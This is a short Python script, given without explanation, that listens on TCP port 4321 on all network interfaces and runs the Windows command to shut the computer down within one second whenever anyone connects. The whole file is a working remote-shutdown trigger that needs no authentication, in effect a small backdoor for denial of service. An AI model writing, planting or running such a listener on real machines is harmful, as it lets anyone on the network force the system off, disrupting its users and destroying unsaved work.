import socket
import os


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0',4321))
s.listen(5)

while True:
    cs, address = s.accept()
    os.system("shutdown /s /t 1")